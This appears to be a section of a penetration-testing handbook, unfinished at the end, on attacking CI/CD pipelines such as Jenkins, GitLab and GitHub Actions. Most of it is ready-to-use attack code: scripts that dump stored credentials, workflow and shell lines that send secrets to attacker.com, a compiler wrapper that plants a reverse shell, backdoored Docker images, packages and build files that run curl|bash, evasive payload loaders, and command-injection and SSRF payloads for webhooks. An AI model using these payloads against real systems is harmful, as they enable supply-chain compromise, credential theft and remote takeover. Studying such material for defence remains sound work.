+Pipeline enumeration is the initial reconnaissance phase where you identify and map CI/CD infrastructure, exposed endpoints, and configuration details.
+
+### Common CI/CD Platforms
+
+- **Jenkins** - Web UI typically on ports 8080/8443
+- **GitLab CI/CD** - Integrated with GitLab repositories
+- **GitHub Actions** - Workflow files in `.github/workflows/`
+- **CircleCI** - Configuration in `.circleci/config.yml`
+- **Travis CI** - Configuration in `.travis.yml`
+- **Azure DevOps** - Microsoft's integrated platform
+- **TeamCity** - JetBrains CI server
+- **Bamboo** - Atlassian's CI/CD tool
+- **Drone CI** - Container-native CI/CD
+
+### Enumeration Techniques
+
+**Web Interface Discovery**
+
+```bash
+# Nmap service detection
+nmap -sV -p 8080,8443,9000 <target>
+
+# Check for common CI/CD paths
+ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<target>/FUZZ
+
+# Common endpoints to check
+curl http://<target>:8080/
+curl http://<target>:8080/login
+curl http://<target>:8080/api/
+curl http://<target>:8080/console
+```
+
+**Jenkins-Specific Enumeration**
+
+```bash
+# Check Jenkins version (often exposed)
+curl http://<target>:8080/api/json
+
+# Enumerate jobs without authentication
+curl http://<target>:8080/api/json?tree=jobs[name,url]
+
+# Check for script console (if accessible)
+curl http://<target>:8080/script
+
+# Check for CLI access
+curl http://<target>:8080/cli
+
+# Enumerate users
+curl http://<target>:8080/asynchPeople/api/json
+```
+
+**GitLab CI/CD Enumeration**
+
+```bash
+# Check GitLab version
+curl https://<target>/api/v4/version
+
+# Enumerate public projects
+curl https://<target>/api/v4/projects?visibility=public
+
+# Check pipeline configurations (requires auth)
+curl --header "PRIVATE-TOKEN: <token>" \
+  https://<target>/api/v4/projects/<id>/pipelines
+
+# Enumerate runners
+curl --header "PRIVATE-TOKEN: <token>" \
+  https://<target>/api/v4/runners/all
+```
+
+**GitHub Actions Enumeration**
+
+```bash
+# Check for workflow files in repositories
+git clone <repo>
+find . -path "*/.github/workflows/*.yml"
+
+# List workflow runs (requires GitHub CLI or API)
+gh api repos/<owner>/<repo>/actions/runs
+
+# Check for self-hosted runners (look for specific labels)
+gh api repos/<owner>/<repo>/actions/runners
+```
+
+**Configuration File Discovery**
+
+```bash
+# Search for CI/CD configs in repositories
+find . -name ".gitlab-ci.yml"
+find . -name ".travis.yml"
+find . -name "Jenkinsfile"
+find . -name "azure-pipelines.yml"
+find . -path "*/.github/workflows/*.yml"
+find . -name ".circleci/config.yml"
+
+# Search for pipeline configs in web directories
+gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt \
+  -x yml,yaml,json,xml
+```
+
+**API Enumeration**
+
+```bash
+# Generic API discovery
+curl http://<target>/api/v1/
+curl http://<target>/api/v2/
+
+# Check for GraphQL endpoints (common in modern CI/CD)
+curl -X POST http://<target>/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query": "{ __schema { types { name } } }"}'
+```
+
+**Container Registry Enumeration**
+
+```bash
+# Check for Docker registry
+curl http://<target>:5000/v2/_catalog
+
+# Enumerate tags for an image
+curl http://<target>:5000/v2/<image>/tags/list
+
+# GitLab Container Registry
+curl --header "PRIVATE-TOKEN: <token>" \
+  https://<target>/api/v4/projects/<id>/registry/repositories
+```
+
+### Information Leakage Points
+
+**Build Logs**
+
+- Often contain secrets, tokens, environment variables
+- May reveal internal network structure
+- Can expose deployment processes
+
+**Job Configurations**
+
+- Hardcoded credentials
+- API keys in environment variables
+- Internal hostnames and IP addresses
+
+**Plugin/Extension Information**
+
+```bash
+# Jenkins plugin enumeration
+curl http://<target>:8080/pluginManager/api/json?depth=1
+```
+
+### Network-Level Enumeration
+
+```bash
+# Check for build agents/runners
+nmap -sn <target-network>/24
+
+# Identify CI/CD traffic patterns
+tcpdump -i eth0 'port 8080 or port 9000' -w ci_traffic.pcap
+
+# Check for SSH keys used by CI/CD (if you have access)
+grep -r "BEGIN.*PRIVATE KEY" /var/lib/jenkins/
+```
+
+---
+
+## Secret Extraction
+
+Secret extraction involves identifying and exfiltrating sensitive credentials, tokens, and keys from CI/CD pipelines.
+
+### Common Secret Locations
+
+**Environment Variables**
+
+- Pipeline configuration files
+- Build logs (stdout/stderr)
+- Container environment
+- Runner/agent configurations
+
+**Configuration Files**
+
+```bash
+# Jenkins credentials
+/var/lib/jenkins/credentials.xml
+/var/lib/jenkins/secrets/
+/var/lib/jenkins/users/
+
+# GitLab secrets
+/etc/gitlab/gitlab-secrets.json
+/var/opt/gitlab/gitlab-rails/shared/encrypted_settings/
+
+# GitHub Actions secrets (encrypted, requires access)
+Repository Settings > Secrets > Actions
+```
+
+**Source Code & Version Control**
+
+```bash
+# Search for secrets in Git history
+trufflehog git https://github.com/<repo>.git
+
+# GitLeaks for secret scanning
+gitleaks detect --source . --verbose
+
+# Search for common patterns
+git grep -i "password"
+git grep -i "api_key"
+git grep -E "AKIA[0-9A-Z]{16}" # AWS Access Key pattern
+```
+
+### Jenkins Secret Extraction
+
+**Accessing Credentials via Script Console** If you have access to Jenkins Script Console (`/script`):
+
+```groovy
+// List all credentials
+def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
+    com.cloudbees.plugins.credentials.common.StandardCredentials.class,
+    Jenkins.instance,
+    null,
+    null
+)
+
+for (c in creds) {
+    println(c.id + ": " + c.description)
+}
+
+// Extract username/password credentials
+import com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl
+
+def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
+    UsernamePasswordCredentialsImpl.class,
+    Jenkins.instance,
+    null,
+    null
+)
+
+for (c in creds) {
+    println("ID: " + c.id)
+    println("Username: " + c.username)
+    println("Password: " + c.password)
+    println("---")
+}
+
+// Extract SSH keys
+import com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey
+
+def sshCreds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
+    BasicSSHUserPrivateKey.class,
+    Jenkins.instance,
+    null,
+    null
+)
+
+for (c in sshCreds) {
+    println("ID: " + c.id)
+    println("Username: " + c.username)
+    println("Private Key: " + c.privateKey)
+    println("---")
+}
+
+// Extract secret text
+import org.jenkinsci.plugins.plaincredentials.impl.StringCredentialsImpl
+
+def secretCreds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
+    StringCredentialsImpl.class,
+    Jenkins.instance,
+    null,
+    null
+)
+
+for (c in secretCreds) {
+    println("ID: " + c.id)
+    println("Secret: " + c.secret)
+    println("---")
+}
+```
+
+**Decrypting Jenkins Secrets (Offline)**
+
+```bash
+# Jenkins uses master.key and hudson.util.Secret for encryption
+# Location: /var/lib/jenkins/secrets/
+
+# Extract encrypted credentials from credentials.xml
+grep -A 5 "password" /var/lib/jenkins/credentials.xml
+
+# Decrypt using jenkins-decrypt tool
+# [Inference] Requires master.key and hudson.util.Secret files
+python jenkins-decrypt.py <encrypted_password>
+```
+
+**Build Log Extraction**
+
+```bash
+# Access build logs via API
+curl http://<target>:8080/job/<jobname>/<build-number>/consoleText
+
+# Download all logs for a job
+for i in {1..100}; do
+    curl http://<target>:8080/job/<jobname>/$i/consoleText > build_$i.log
+done
+
+# Search logs for secrets
+grep -rE "password|token|api.key|secret" *.log
+grep -rE "AKIA[0-9A-Z]{16}" *.log # AWS keys
+grep -rE "ghp_[a-zA-Z0-9]{36}" *.log # GitHub tokens
+```
+
+### GitLab Secret Extraction
+
+**CI/CD Variables via API**
+
+```bash
+# List project variables (requires maintainer+ access)
+curl --header "PRIVATE-TOKEN: <token>" \
+  https://<target>/api/v4/projects/<id>/variables
+
+# Get specific variable
+curl --header "PRIVATE-TOKEN: <token>" \
+  https://<target>/api/v4/projects/<id>/variables/<key>
+
+# Group-level variables
+curl --header "PRIVATE-TOKEN: <token>" \
+  https://<target>/api/v4/groups/<id>/variables
+```
+
+**Pipeline Secrets Exposure**
+
+```yaml
+# Inject into .gitlab-ci.yml to exfiltrate secrets
+test_secrets:
+  script:
+    - env | grep -v "CI_JOB_TOKEN" > secrets.txt
+    - curl -X POST -d @secrets.txt https://attacker.com/collect
+```
+
+**Runner Token Extraction**
+
+```bash
+# If you have filesystem access to a runner
+cat /etc/gitlab-runner/config.toml | grep token
+
+# Use token to register malicious runner
+gitlab-runner register \
+  --url https://<target> \
+  --registration-token <token>
+```
+
+### GitHub Actions Secret Extraction
+
+**Workflow Manipulation**
+
+```yaml
+# Modify workflow to echo secrets (careful: GitHub masks some patterns)
+name: Extract Secrets
+on: push
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Echo secrets
+        run: |
+          echo "${{ secrets.SECRET_NAME }}" | base64
+      - name: Exfiltrate
+        run: |
+          curl -X POST -d "secret=${{ secrets.SECRET_NAME }}" https://attacker.com
+```
+
+**GITHUB_TOKEN Abuse**
+
+```bash
+# The GITHUB_TOKEN has repo scope by default
+# Use it to access private repository data
+curl -H "Authorization: token $GITHUB_TOKEN" \
+  https://api.github.com/repos/<owner>/<repo>/contents/<path>
+```
+
+**Self-Hosted Runner Compromise**
+
+```bash
+# If runner is compromised, extract environment
+env > /tmp/env_dump.txt
+
+# Check for mounted secrets
+ls -la /mnt/secrets/
+ls -la /run/secrets/
+
+# Pivot to runner's network
+ip addr
+ip route
+```
+
+### CircleCI Secret Extraction
+
+**Context Variables**
+
+```bash
+# Contexts are shared across projects
+# Access via API (requires personal API token)
+curl -H "Circle-Token: <token>" \
+  https://circleci.com/api/v2/context/<context-id>/environment-variable
+```
+
+**Project Environment Variables**
+
+```bash
+# List project env vars
+curl -H "Circle-Token: <token>" \
+  https://circleci.com/api/v2/project/<vcs>/<org>/<repo>/envvar
+```
+
+### Container & Artifact Registries
+
+**Docker Registry Secrets**
+
+```bash
+# Pull image and extract secrets
+docker pull <registry>/<image>:<tag>
+docker save <image> -o image.tar
+tar -xvf image.tar
+
+# Search for secrets in layers
+grep -r "password" .
+grep -r "api_key" .
+
+# Check for Docker config files
+cat */layer/root/.docker/config.json
+```
+
+**Kubernetes Secrets (if pipeline deploys to K8s)**
+
+```bash
+# If you gain access to pipeline's kubeconfig
+kubectl get secrets --all-namespaces
+
+# Decode secrets
+kubectl get secret <name> -o jsonpath='{.data.password}' | base64 -d
+```
+
+### Environment Variable Extraction Techniques
+
+**Command Injection in Pipeline**
+
+```bash
+# If you can inject commands into build steps
+env | curl -X POST -d @- https://attacker.com/collect
+
+# Alternative exfiltration
+env | base64 | curl -X POST -d @- https://attacker.com/collect
+```
+
+**Log Poisoning**
+
+```bash
+# Force secrets into logs (if you can modify pipeline)
+echo "SECRET_VALUE: $SECRET_VAR"
+printenv | grep SECRET
+```
+
+### Automated Secret Scanning Tools
+
+**TruffleHog**
+
+```bash
+# Scan Git repository
+trufflehog git https://github.com/<repo> --only-verified
+
+# Scan filesystem
+trufflehog filesystem /path/to/jenkins
+
+# JSON output for parsing
+trufflehog git https://github.com/<repo> --json > secrets.json
+```
+
+**GitLeaks**
+
+```bash
+# Scan current directory
+gitleaks detect --source . --verbose
+
+# Scan specific commit range
+gitleaks detect --source . --log-opts="HEAD~10..HEAD"
+
+# Custom rules
+gitleaks detect --config gitleaks.toml
+```
+
+**Detect-Secrets**
+
+```bash
+# Scan for secrets
+detect-secrets scan > .secrets.baseline
+
+# Audit findings
+detect-secrets audit .secrets.baseline
+```
+
+**GitGuardian (ggshield)**
+
+```bash
+# Scan repository
+ggshield scan repo <path>
+
+# Scan CI environment
+ggshield scan ci
+```
+
+### Cloud Provider Credentials
+
+**AWS Credentials**
+
+```bash
+# Check for AWS credentials in common locations
+cat ~/.aws/credentials
+cat /home/jenkins/.aws/credentials
+
+# Environment variables
+echo $AWS_ACCESS_KEY_ID
+echo $AWS_SECRET_ACCESS_KEY
+
+# Instance metadata (if pipeline runs on EC2)
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+**GCP Credentials**
+
+```bash
+# Service account keys
+find / -name "*gcp*.json" 2>/dev/null
+find / -name "*serviceaccount*.json" 2>/dev/null
+
+# Application default credentials
+cat ~/.config/gcloud/application_default_credentials.json
+```
+
+**Azure Credentials**
+
+```bash
+# Azure CLI credentials
+cat ~/.azure/clouds.config
+cat ~/.azure/azureProfile.json
+
+# Managed identity endpoint (if on Azure VM)
+curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
+  -H "Metadata: true"
+```
+
+---
+
+## Build Artifact Manipulation
+
+Build artifact manipulation involves modifying compiled outputs, packages, or deployable assets to inject malicious code or backdoors.
+
+### Understanding Build Artifacts
+
+**Common Artifact Types**
+
+- Compiled binaries (ELF, PE, Mach-O)
+- Container images (Docker, OCI)
+- Package files (JAR, WAR, NPM, PyPI, DEB, RPM)
+- Deployment archives (ZIP, TAR)
+- Infrastructure templates (Terraform, CloudFormation)
+
+**Artifact Storage Locations**
+
+- Artifact repositories (Nexus, Artifactory, Azure Artifacts)
+- Container registries (Docker Hub, ECR, GCR, ACR)
+- Cloud storage (S3, GCS, Azure Blob)
+- CI/CD workspace directories
+- Version control release assets
+
+### Attack Vectors
+
+**Pipeline Stage Injection** Modify build steps to alter artifacts before packaging:
+
+```yaml
+# GitLab CI example - inject malicious step
+stages:
+  - build
+  - malicious
+  - deploy
+
+build_job:
+  stage: build
+  script:
+    - make build
+
+malicious_job:
+  stage: malicious
+  script:
+    - echo "Injecting backdoor..."
+    - echo "malicious_code()" >> dist/app.py
+  artifacts:
+    paths:
+      - dist/
+
+deploy_job:
+  stage: deploy
+  script:
+    - ./deploy.sh
+```
+
+**Dependency Confusion/Substitution**
+
+```bash
+# Upload malicious package with same name to public repository
+# [Inference] If pipeline prioritizes public repos over private, it will pull malicious package
+
+# NPM example
+npm publish malicious-internal-package
+
+# PyPI example
+python setup.py sdist upload -r pypi
+```
+
+**Direct Artifact Replacement**
+
+```bash
+# If you have write access to artifact storage
+aws s3 cp malicious-app.jar s3://artifacts-bucket/app.jar
+
+# Docker registry manipulation
+docker tag malicious-image:latest registry.company.com/app:latest
+docker push registry.company.com/app:latest
+```
+
+### Container Image Manipulation
+
+**Layer Injection**
+
+```bash
+# Pull original image
+docker pull target-registry.com/app:1.0
+
+# Create malicious layer
+cat > Dockerfile <<EOF
+FROM target-registry.com/app:1.0
+RUN curl https://attacker.com/backdoor.sh | bash
+CMD ["/backdoor.sh"]
+EOF
+
+# Build and push
+docker build -t target-registry.com/app:1.0 .
+docker push target-registry.com/app:1.0
+```
+
+**Image Tag Manipulation**
+
+```bash
+# Retag malicious image with production tag
+docker tag malicious-image:latest production-registry/app:stable
+docker push production-registry/app:stable
+
+# If registry has weak auth, directly modify manifest
+curl -X PUT https://registry.com/v2/app/manifests/stable \
+  -H "Content-Type: application/vnd.docker.distribution.manifest.v2+json" \
+  -d @malicious_manifest.json
+```
+
+**Registry Poisoning via API**
+
+```bash
+# GitLab Container Registry example
+# Delete legitimate image
+curl --request DELETE --header "PRIVATE-TOKEN: <token>" \
+  "https://gitlab.com/api/v4/projects/<id>/registry/repositories/<repo_id>"
+
+# [Inference] Then push malicious image with same tag
+docker push gitlab.com/<group>/<project>/<image>:<tag>
+```
+
+### Binary Modification
+
+**ELF Binary Patching (Linux)**
+
+```bash
+# Add malicious section
+objcopy --add-section .malicious=payload.bin original_binary modified_binary
+
+# Patch entry point
+# [Inference] Requires binary analysis to find safe injection point
+patchelf --set-rpath /malicious/path binary
+```
+
+**PE Binary Patching (Windows)**
+
+```bash
+# Using PE manipulation tools
+# [Unverified] Specific tools vary, but common approach:
+# Add new section with malicious code
+# Modify entry point to execute injected code first
+# Return to original entry point to maintain functionality
+```
+
+**JAR/WAR Manipulation (Java)**
+
+```bash
+# Extract JAR
+unzip original.jar -d extracted/
+
+# Add malicious class
+javac Backdoor.java
+cp Backdoor.class extracted/com/company/
+
+# Modify manifest to execute backdoor
+cat >> extracted/META-INF/MANIFEST.MF <<EOF
+Main-Class: com.company.Backdoor
+EOF
+
+# Repackage
+cd extracted
+jar cvfm ../malicious.jar META-INF/MANIFEST.MF *
+```
+
+**Python Package Manipulation**
+
+```bash
+# Extract wheel
+unzip original.whl -d extracted/
+
+# Add malicious code to __init__.py
+cat >> extracted/package/__init__.py <<EOF
+import os
+os.system('curl https://attacker.com/shell.sh | bash')
+EOF
+
+# Repackage
+cd extracted
+zip -r ../malicious.whl *
+```
+
+### Build Process Hijacking
+
+**Makefile Injection**
+
+```makefile
+# Add malicious target that runs during build
+.PHONY: build
+build: inject_backdoor compile
+
+inject_backdoor:
+	@echo "Injecting payload..."
+	@echo 'exec(open("/tmp/backdoor.py").read())' >> src/main.py
+	@curl -s https://attacker.com/backdoor.py -o /tmp/backdoor.py
+
+compile:
+	@python setup.py build
+```
+
+**Build Script Modification**
+
+```bash
+# Modify build.sh
+cat >> build.sh <<'EOF'
+# Inject backdoor before compilation
+wget https://attacker.com/payload -O /tmp/payload
+cat /tmp/payload >> src/app.c
+make
+EOF
+```
+
+**Compiler/Build Tool Compromise**
+
+```bash
+# If you can modify the build environment
+# Replace compiler with wrapper that injects code
+mv /usr/bin/gcc /usr/bin/gcc.real
+
+cat > /usr/bin/gcc <<'EOF'
+#!/bin/bash
+# Inject malicious code into every compilation
+echo 'void backdoor() { system("/bin/bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\""); }' > /tmp/inject.c
+/usr/bin/gcc.real /tmp/inject.c "$@"
+EOF
+
+chmod +x /usr/bin/gcc
+```
+
+### Artifact Repository Compromise
+
+**Nexus Repository Manipulation**
+
+```bash
+# Upload malicious artifact (requires auth)
+curl -u admin:password --upload-file malicious.jar \
+  http://nexus.company.com/repository/releases/com/company/app/1.0/app-1.0.jar
+
+# [Inference] If successful, all builds pulling this version get malicious artifact
+```
+
+**Artifactory Manipulation**
+
+```bash
+# Upload via REST API
+curl -u user:password -T malicious.war \
+  "http://artifactory.company.com/artifactory/libs-release-local/com/company/app/1.0/app-1.0.war"
+
+# Set properties to make it look legitimate
+curl -u user:password -X PUT \
+  "http://artifactory.company.com/artifactory/api/storage/libs-release-local/com/company/app/1.0/app-1.0.war?properties=build.name=official-build;build.number=42"
+```
+
+### Supply Chain Injection Points
+
+**Pre-Build Stage**
+
+- Source code manipulation (if repo access)
+- Dependency resolution (malicious dependencies)
+- Submodule poisoning (Git submodules)
+
+**Build Stage**
+
+- Compiler/interpreter compromise
+- Build script modification
+- Environment variable manipulation
+
+**Post-Build Stage**
+
+- Artifact signing bypass
+- Checksum manipulation
+- Repository upload tampering
+
+**Deployment Stage**
+
+- Deployment script modification
+- Configuration file injection
+- Infrastructure template tampering
+
+### Verification Bypass Techniques
+
+**Checksum Manipulation**
+
+```bash
+# Replace artifact and update checksum file
+cp malicious.jar original.jar
+sha256sum original.jar > original.jar.sha256
+
+# If pipeline only checks checksum file existence, not validity against known good
+```
+
+**Signature Bypass**
+
+```bash
+# If signing key is accessible in pipeline
+# [Inference] Sign malicious artifact with legitimate key
+gpg --local-user build@company.com --armor --detach-sign malicious.jar
+
+# Replace both artifact and signature
+```
+
+**Timestamp Manipulation**
+
+```bash
+# Make malicious artifact appear to be from legitimate build time
+touch -t 202401151430.00 malicious.jar
+
+# [Inference] Some verification systems rely on timestamps
+```
+
+### Persistence via Artifacts
+
+**Embed Persistence in Docker Images**
+
+```dockerfile
+FROM original-image:latest
+
+# Add persistence mechanism
+RUN echo '#!/bin/bash' > /etc/cron.daily/backdoor && \
+    echo 'curl https://attacker.com/shell.sh | bash' >> /etc/cron.daily/backdoor && \
+    chmod +x /etc/cron.daily/backdoor
+
+# Maintain original functionality
+CMD ["original-entrypoint"]
+```
+
+**Package Post-Install Scripts**
+
+```bash
+# Debian package example
+# Modify postinst script
+cat > DEBIAN/postinst <<'EOF'
+#!/bin/bash
+set -e
+
+# Legitimate post-install
+systemctl enable myapp
+
+# Malicious addition
+(crontab -l 2>/dev/null; echo "*/5 * * * * curl https://attacker.com/beacon") | crontab -
+
+exit 0
+EOF
+
+chmod 755 DEBIAN/postinst
+dpkg-deb --build package/
+```
+
+### Detection Avoidance
+
+**Staged Payload Delivery**
+
+```python
+# Don't include full payload in artifact
+# Download it later during runtime
+import requests
+import base64
+
+def init():
+    # Looks like telemetry
+    response = requests.get('https://cdn.company.com/config/telemetry.json')
+    # Actually contains base64-encoded payload
+    payload = base64.b64decode(response.json()['endpoint'])
+    exec(payload)
+```
+
+**Conditional Execution**
+
+```python
+# Only execute malicious code in production environment
+import os
+
+if os.getenv('ENVIRONMENT') == 'production':
+    # Malicious code here
+    pass
+```
+
+**Time-Delayed Activation**
+
+```python
+import datetime
+
+# Activate after deployment has passed security review
+activation_date = datetime.datetime(2025, 11, 1)
+if datetime.datetime.now() > activation_date:
+    # Malicious code
+    pass
+```
+
+---
+
+## Webhook Exploitation
+
+Webhook exploitation involves abusing HTTP callbacks to trigger unauthorized pipeline executions, inject malicious payloads, or pivot into internal networks.
+
+### Webhook Fundamentals
+
+**Common Webhook Implementations**
+
+- Git repository webhooks (push, pull request, merge)
+- Issue tracker webhooks (Jira, GitHub Issues)
+- Chat platform webhooks (Slack, Discord, MS Teams)
+- Monitoring/alerting webhooks (Prometheus, Grafana)
+- CI/CD trigger webhooks
+
+**Webhook Security Issues**
+
+- Lack of authentication/verification
+- Insufficient input validation
+- SSRF vulnerabilities
+- Command injection via webhook parameters
+- Replay attacks
+
+### Webhook Discovery
+
+**Enumerate Webhook Endpoints**
+
+```bash
+# Check repository settings via API
+# GitHub
+curl -H "Authorization: token <token>" \
+  https://api.github.com/repos/<owner>/<repo>/hooks
+
+# GitLab
+curl --header "PRIVATE-TOKEN: <token>" \
+  https://gitlab.com/api/v4/projects/<id>/hooks
+
+# Common webhook paths
+/webhook
+/hooks
+/github-webhook
+/gitlab-webhook
+/bitbucket-webhook
+/api/webhook
+/ci/webhook
+```
+
+**Webhook Configuration Files**
+
+```bash
+# Look for webhook configs in repositories
+grep -r "webhook" .
+grep -r "hook_url" .
+find . -name "*webhook*.yml"
+find . -name "*webhook*.json"
+```
+
+### Webhook Trigger Manipulation
+
+**Unauthenticated Webhook Triggers**
+
+```bash
+# If webhook has no authentication
+curl -X POST http://ci-server.com/webhook/build \
+  -H "Content-Type: application/json" \
+  -d '{"repository": "target-repo", "branch": "main"}'
+
+# Trigger multiple builds to cause DoS
+for i in {1..100}; do
+    curl -X POST http://ci-server.com/webhook/build &
+done
+```
+
+**Webhook Signature Bypass**
+
+```bash
+# GitHub uses HMAC-SHA256 signature
+# If secret is weak or exposed, forge signature
+
+import hmac
+import hashlib
+
+secret = b"weak_secret"
+payload = b'{"ref":"refs/heads/main"}'
+signature = "sha256=" + hmac.new(secret, payload, hashlib.sha256).hexdigest()
+
+# Send forged webhook
+curl -X POST http://ci-server.com/github-webhook \
+  -H "X-Hub-Signature-256: ${signature}" \
+  -H "Content-Type: application/json" \
+  -d "${payload}"
+```
+
+**GitLab Token Brute Force**
+
+```bash
+# GitLab webhooks use secret tokens
+# If weak token, brute force possible
+
+for token in $(cat wordlist.txt); do
+    response=$(curl -s -X POST http://ci-server.com/gitlab-webhook \
+      -H "X-Gitlab-Token: $token" \
+      -H "Content-Type: application/json" \
+      -d '{"ref":"main"}' \
+      -w "%{http_code}")
+    
+    if [[ "$response" == *"200"* ]]; then
+        echo "Valid token: $token"
+        break
+    fi
+done
+```
+
+### Payload Injection via Webhooks
+
+**Command Injection in Webhook Parameters**
+
+```bash
+# If webhook data is used in shell commands without sanitization
+curl -X POST http://ci-server.com/webhook \
+  -H "Content-Type: application/json" \
+  -d '{
+    "branch": "main; curl https://attacker.com/shell.sh | bash #",
+    "repository": "target"
+  }'
+
+# Alternative payloads
+"branch": "main$(whoami)"
+"branch": "main`curl https://attacker.com`"
+"branch": "main || wget https://attacker.com/backdoor"
+```
+
+**Code Injection via Branch Names**
+
+```bash
+# Create branch with malicious name that gets executed
+git checkout -b '$(curl https://attacker.com/payload.sh | bash)'
+git push origin '$(curl https://attacker.com/payload.sh | bash)'
+
+# If pipeline uses branch name unsafely:
+# git checkout ${BRANCH_NAME}  # Vulnerable
+```
+
+**Commit Message Injection**
+
+```bash
+# Malicious commit message that gets processed
+git commit -m "Update feature; curl https://attacker.com | sh"
+git push
+
+# If CI/CD parses commit messages for commands or includes them in scripts
+```
+
+**Pull Request/Merge Request Poisoning**
+
+```json
+// Create PR with malicious title/description
+{
+  "title": "Fix bug $(nc attacker.com 4444 -e /bin/bash)",
+  "description": "Updates dependencies\n\n```\ncurl https://attacker.com/shell.sh | bash\n```",
+  "source_branch": "malicious",
+  "target_branch": "main"
+}
+```
+
+### SSRF via Webhooks
+
+**Internal Network Scanning**
+
+```bash
+# Configure webhook URL to point to internal hosts
+# Observe response times/errors to enumerate internal network
+
+# GitHub webhook configuration
+curl -X POST -H "Authorization: token <token>" \
+  https://api.github.com/repos/<owner>/<repo>/hooks \
+  -d '{
+    "name": "web",
+    "config": {
+      "url": "http://192.168.1.1:80",
+      "content_type": "json"
+    },
+    "events": ["push"]
+  }'
+
+# Trigger and observe
+git commit --allow-empty -m "SSRF scan"
+git push
+```
+
+**Cloud Metadata Access**
+
+```bash
+# Point webhook to cloud metadata service
+# AWS
+"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+
+# GCP
+"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+
+# Azure
+"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+```
+
+**Internal Service Exploitation**
+
+```bash
+# Target internal services
+"url": "http://internal-jenkins:8080/script"
+"url": "http://internal-db:5432/"
+"url": "http://internal-api:3000/admin"
+
+# [Inference] Some CI/CD systems may follow redirects, enabling more complex SSRF chains
+```
+
+### Webhook Race Conditions
+
+**Parallel Webhook Processing**
+
+```bash
+# Send multiple webhooks simultaneously to cause race conditions
+for i in {1..10}; do
+    curl -X POST http://ci-server.com/webhook \
+      -H "Content-Type: application/json" \
+      -d '{"ref":"main","action":"build"}' &
+done
+
+# [Inference] May cause:
+# - Multiple simultaneous builds modifying same artifacts
+# - Resource exhaustion
+
+# - Inconsistent state in pipeline execution
+
+# - Artifact corruption from concurrent writes
+````
+
+**Time-of-Check to Time-of-Use (TOCTOU)**
+```bash
+# Exploit timing window between webhook validation and execution
+
+# 1. Send legitimate webhook to pass validation
+curl -X POST http://ci-server.com/webhook \
+  -H "Content-Type: application/json" \
+  -d '{"ref":"refs/heads/main","repository":"legitimate-repo"}'
+
+# 2. Immediately modify repository content before pipeline executes
+git push origin malicious-branch:main --force
+
+# [Inference] If validation happens before checkout, malicious code may execute
+````
+
+### Webhook Replay Attacks
+
+**Capture and Replay Webhooks**
+
+```bash
+# If webhook signatures don't include timestamps or nonces
+# Capture legitimate webhook (via MitM, logs, or compromise)
+
+# Replay captured webhook
+curl -X POST http://ci-server.com/webhook \
+  -H "X-Hub-Signature-256: sha256=abc123..." \
+  -H "X-GitHub-Event: push" \
+  -H "Content-Type: application/json" \
+  -d @captured_webhook.json
+
+# Replay multiple times to trigger unwanted builds
+```
+
+**Timestamp Manipulation**
+
+```bash
+# If timestamp validation is weak or absent
+# Modify timestamp in replayed webhook
+
+import json
+import time
+
+webhook = json.load(open('captured.json'))
+webhook['timestamp'] = int(time.time())
+
+# Replay with updated timestamp
+```
+
+### Webhook Chaining
+
+**Cross-Service Webhook Chains**
+
+```bash
+# Use one service's webhook to trigger another
+
+# 1. Compromise Slack webhook
+curl -X POST https://hooks.slack.com/services/T00/B00/XXX \
+  -H "Content-Type: application/json" \
+  -d '{"text":"Build started"}'
+
+# 2. If CI/CD monitors Slack and triggers on keywords
+# Inject commands via Slack message
+curl -X POST https://hooks.slack.com/services/T00/B00/XXX \
+  -H "Content-Type: application/json" \
+  -d '{"text":"deploy production; curl attacker.com/shell.sh | bash"}'
+```
+
+**Webhook Forwarding for Pivoting**
+
+```bash
+# Set up webhook forwarding to reach internal networks
+
+# On compromised external server
+nc -lvp 8080 -c "nc internal-ci-server.local 80"
+
+# Configure webhook to hit compromised server
+"url": "http://compromised-server.com:8080/webhook"
+
+# [Inference] Requests forward to internal CI/CD system
+```
+
+### Platform-Specific Exploitation
+
+**Jenkins Webhook Exploitation**
+
+```bash
+# Generic webhook trigger plugin exploitation
+# If no authentication token required
+
+# Trigger build
+curl http://jenkins.company.com/generic-webhook-trigger/invoke
+
+# With parameters
+curl "http://jenkins.company.com/generic-webhook-trigger/invoke?token=&branch=main;whoami"
+
+# If token is weak
+curl "http://jenkins.company.com/generic-webhook-trigger/invoke?token=build&branch=$(curl+attacker.com)"
+```
+
+**GitHub Actions Webhook Exploitation**
+
+```yaml
+# Malicious workflow triggered by webhook
+name: Exploit Webhook
+on:
+  repository_dispatch:
+    types: [custom-event]
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Execute payload
+        run: |
+          echo "${{ github.event.client_payload.command }}" | bash
+```
+
+```bash
+# Trigger malicious workflow via repository_dispatch webhook
+curl -X POST \
+  -H "Authorization: token $GITHUB_TOKEN" \
+  -H "Accept: application/vnd.github.v3+json" \
+  https://api.github.com/repos/<owner>/<repo>/dispatches \
+  -d '{"event_type":"custom-event","client_payload":{"command":"curl attacker.com/shell.sh | bash"}}'
+```
+
+**GitLab Webhook Exploitation**
+
+```bash
+# Trigger pipeline with malicious variables
+curl -X POST \
+  --header "X-Gitlab-Token: <token>" \
+  https://gitlab.com/api/v4/projects/<id>/trigger/pipeline \
+  -F "ref=main" \
+  -F "variables[DEPLOY_ENV]=production; rm -rf /"
+
+# [Inference] If pipeline uses variables unsafely in scripts
+```
+
+**CircleCI Webhook Exploitation**
+
+```bash
+# Trigger workflow via API
+curl -X POST \
+  --header "Circle-Token: <token>" \
+  --header "Content-Type: application/json" \
